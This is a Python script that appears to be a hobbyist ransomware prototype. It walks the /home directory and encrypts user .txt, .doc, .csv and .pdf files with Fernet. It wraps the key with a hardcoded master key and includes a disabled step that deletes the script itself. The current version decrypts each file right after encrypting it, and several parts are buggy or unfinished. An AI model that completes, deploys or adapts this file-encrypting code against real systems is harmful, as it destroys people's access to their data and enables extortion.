#!/usr/bin/python3
import os
import re
import sys
from os import remove
from sys import argv
from cryptography.fernet import Fernet

# This part of the code is intended to check if you have the cryptography library.
# It will look through all the files I think and look for one that starts with "cryptography".
# If its a match it will import Fernet which is a enryption algorith from cryptography.
# If not it will pip install cryptography.
# But the problem is that when I ran this part of the code it went into a infinite loop and I couldnt even stop it with ctrl C.
# So for now this will stay here and I will work on it later. 
"""
checkpath = os.path.abspath("/")
for root, dirs, files in os.walk(checkpath):
    for name in files:
        match = re.search("\Acryptography", name)
        if match:
            from cryptography.fernet import Fernet
            print(os.path.join(root, name))
        else:
            os.system("pip install cryptography")
"""
encrypt_count = 0
decrypt_count = 0

path = os.path.abspath("/home")
for root, dirs, files in os.walk(path):
    for name in files:
        matchtxt = re.search("\.txt$", name)
        matchdoc = re.search("\.doc$", name)
        matchcsv = re.search("\.csv$", name)
        matchpdf = re.search("\.pdf$", name)
        if matchtxt or matchdoc or matchcsv or matchpdf:
           # Before you do this there are .txt file that programs use for example Brave seems to have some.
           # Not sure what will happen when they are encrypted but just in case I have taken a snapshot.
           # So I recommend not trying to run this without knowing.

           # Key Generation
            key = Fernet.generate_key()
            with open('filekey.key', 'wb') as filekey:
                filekey.write(key)

           # Encryption
            with open('filekey.key', 'rb') as filekey:
                key= filekey.read()

            fernet = Fernet(key)

            with open(os.path.join(root, name), 'rb') as file:
                original = file.read()

            encrypted = fernet.encrypt(original)

            with open(os.path.join(root, name), 'wb') as encrypted_file:
                encrypted_file.write(encrypted)
            
            encrypt_count = encrypt_count + 1            
            print("Encrypted")
           # Decryption
            with open(os.path.join(root, name), 'rb') as enc_file:
                encrypted = enc_file.read()

            decrypted = fernet.decrypt(encrypted)

            with open(os.path.join(root, name), 'wb') as dec_file:
                dec_file.write(decrypted)
            
            decrypt_count = decrypt_count + 1
            print("Decrypted")

print(encrypt_count, " files has been encrypted")
print(decrypt_count, " files has been decrypted")

master_key = "VX9OmPd8dLnCjTp3rUZ45ropCgo6Ovf5l0fRicM3dGA="
fernet = Fernet(master_key)
with open('filekey.key', 'rb') as filekey:
    original = file.read()
    encrypted = fernet.encrypt(original)

with open('filekey.key', 'wb') as filekey:
    encrypted_file.write(encrypted)


# This will delete the this file.
# The check is there so I can disable it.
check = False 
if check is True:
    print("File has been removed")
    remove(argv[0])
